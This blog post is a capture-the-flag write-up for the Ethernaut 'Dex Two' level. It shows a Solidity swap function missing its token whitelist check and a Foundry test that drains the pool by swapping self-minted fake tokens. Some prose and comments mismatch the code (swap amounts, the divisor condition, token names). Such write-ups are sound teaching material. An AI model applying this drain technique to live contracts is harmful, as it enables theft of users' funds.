---
title: 'Ethernaut Challenge #22 Solution — Dex Two'
excerpt: This is Part 22 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>The goal of this challenge is to be able to steal all the tokens inside the Dex. The level starts with the Dex owning (as liquidity) 100 tokens of both `token1` and `token2` while we own just 10 of each.
coverImage:
  url: '/assets/blog/ethernaut/dex2.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-08-12T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/dex2.svg'
---

This is Part 22 of the ["Let’s play OpenZeppelin Ethernaut CTF"](https://stermi.xyz/blog/lets-play-openzeppelin-ethernaut) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

## Challenge #22: Dex Two

> This level will ask you to break `DexTwo`, a subtlely modified `Dex` contract from the previous level, in a different way.
>
> You need to drain all balances of token1 and token2 from the `DexTwo` contract to succeed in this level.
>
> You will still start with 10 tokens of `token1` and 10 of `token2`. The DEX contract still starts with 100 of each token.
>
> > Things that might help:
>
> - How has the `swap` method been modified?
> - Could you use a custom token contract in your attack?
>
> Level author(s): [Scott Tsai](http://scottt.tw/)

The goal of this challenge, like the previous one, is to drain both `token1` and `token2` from the `DexTwo` contract.

## Study the contracts

The `DexTwo` contract is much identical to the one from the previous `Dex` challenge, the only thing that changes are some function names and the content of the `swap` function.

Other than the `DexTwo` contract that behave like a Dex, we also have `SwappableTokenTwo`, an ERC20 token implementation.

Let's see the content of the `swap` function

```solidity
function swap(
    address from,
    address to,
    uint256 amount
) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

Can you see what's missing compared to the previous version of the same function on `Dex` contract? It's a critical check.

The current `swap` function is not checking that `from` and `to` are actually the whitelisted `token1` and `token2` tokens handled by the `DexTwo` contract.

This is the check that was present in the previous version of the function: `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`

What does this mean? This allows an attacker to call the `swap` function, selling an **arbitrary** `from` token to get the "real" `to` token from the Dex. This mean that we could create a freshly new `UselessERC20` token totally owned and managed by us (we can mint, burn, do whatever we want) and gain some `token1` or `token2` for free.

Can we drain the `DexTwo` contract `token1` and `token2` with one call each? To do so, we need to find the correct amount of `fakeToken` to sell to get back 100 `token1`.

Let's do some math, looking at the `getSwapAmount` function that calculate the swap price:

```
100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken
100 token1 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken
```

We have two variables that we can control. We know for sure that `DexBalanceOfFakeToken` must be **> 1** otherwise the transaction will revert because of **division by 0**. If we send 1 `FakeToken` to `DexTwo` we would have

```
100 token1 = amountOfFakeTokenToSell * 100 / 1
1 token1 = amountOfFakeTokenToSell
```

So by sending `1 FakeToken1` to the `DexTwo` contract to give it some liquidity, we can swap 100 `FakeToken` to get back 100 `token1`. After that, we just need to repeat the same operation with **another** instance of `FakeToken2` and drain all the `token2` from the Dex.

## Solution code

Here's the code used in the test case to solve the challenge

```solidity
function exploitLevel() internal override {
    vm.startPrank(player, player);

    // Deploy a fake token based on the SwappableTokenTwo contract
    // Mint 10k tokens and send them to the player (msg.sender)
    SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), "Fake Token 1", "FKT1", 10_000);
    SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), "Fake Token 1", "FKT1", 10_000);


    // Approve the dex to manage all of our token
    token1.approve(address(level), 2**256 - 1);
    token2.approve(address(level), 2**256 - 1);
    fakeToken1.approve(address(level), 2**256 - 1);
    fakeToken2.approve(address(level), 2**256 - 1);

    // send 1 fake token to the DexTwo to have at least 1 of liquidity
    ERC20(fakeToken1).transfer(address(level), 1);
    ERC20(fakeToken2).transfer(address(level), 1);

    // Swap 100 fakeToken1 to get 100 token1
    level.swap(address(fakeToken1), address(token1), 1);
    // Swap 100 fakeToken2 to get 100 token2
    level.swap(address(fakeToken2), address(token2), 1);

    // Assert that we have drained the Dex contract
    assertEq(token1.balanceOf(address(level)) == 0 && token2.balanceOf(address(level)) == 0, true);

    vm.stopPrank();
}
```

You can read the full solution of the challenge opening [DexTwo.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/DexTwo.t.sol)

## Further reading

- [OpenZeppelin: The Dangers of Price Oracles in Smart Contracts](https://www.youtube.com/watch?v=YGO7nzpXCeA)
- [OpenZeppelin: Smart Contract Security Guidelines #3: The Dangers of Price Oracles](https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/)
- [samczsun: So you want to use a price oracle](https://samczsun.com/so-you-want-to-use-a-price-oracle/)
- [cmichel: Pricing LP tokens | Warp Finance hack](https://cmichel.io/pricing-lp-tokens/)
- [Ethereum Docs: Oracles](https://ethereum.org/en/developers/docs/oracles/)
- [Chainlink: What Is a Blockchain Oracle?](https://chain.link/education/blockchain-oracles)
- [Uniswap TWAP](https://docs.uniswap.org/protocol/concepts/V3-overview/oracle)
- [Consensys: Integer Division](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/integer-division/)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
